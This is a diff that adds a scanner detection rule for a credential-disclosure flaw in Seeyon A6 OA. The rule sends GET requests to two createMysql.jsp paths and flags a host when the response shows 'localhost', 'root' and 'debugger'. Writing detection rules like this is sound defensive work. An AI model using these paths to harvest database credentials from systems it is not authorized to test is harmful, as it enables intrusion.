@@ -1,0 +1,14 @@
+name: seeyon-a6-createmysql-disclosure
+groups:
+  rules1:
+    - method: GET
+      path: "/yyoa/createMysql.jsp"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'localhost') && response.body.bcontains(b'root') && response.body.bcontains(b'debugger')
+  rules2:
+    - method: GET
+      path: "/yyoa/ext/createMysql.jsp"
+      expression: |
+        response.status == 200 && response.body.bcontains(b'localhost') && response.body.bcontains(b'root') && response.body.bcontains(b'debugger')
+detail:
+  author: 666
